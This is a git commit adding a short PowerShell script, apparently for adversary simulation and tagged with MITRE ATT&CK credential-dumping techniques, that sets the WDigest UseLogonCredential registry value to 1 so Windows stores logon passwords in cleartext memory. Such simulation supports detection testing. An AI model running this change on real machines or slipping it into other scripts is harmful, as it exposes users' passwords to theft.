a28019a8cfb111f7b7045bbeac2de7a5fc035ec9
mthcht <mathieuchotplassot@gmail.com>
2022-12-14 08:51:26 +0100

    Create check_and_enable_wdigest_uselogoncredential_in_registry.ps1

---
+++ Simulation/Windows/System/check_and_enable_wdigest_uselogoncredential_in_registry.ps1
@@ -0,0 +1,15 @@
+# T1112 - Modify Registry
+# T1003 - OS Credential Dumping
+# behavior and detection : https://blog.netwrix.com/2022/10/11/wdigest-clear-text-passwords-stealing-more-than-a-hash/
+
+$registryPath = "HKLM:\System\CurrentControlSet\Control\SecurityProviders\Wdigest"
+
+#Check if Wdigest UseLogonCredential is Enabled in the registry 
+$checkReg = (Get-ItemProperty -Path $registryPath).UseLogonCredential
+
+#Enable Wdigest UseLogonCredential in the registry
+If($checkReg -eq 0 -or $checkReg -eq $null){
+    Set-ItemProperty -Path $registryPath -Name 'UseLogonCredential' -Value 1
+} Elseif($checkReg -eq 1) {
+    Write-Host "Wdigest is Already Enabled"
+}
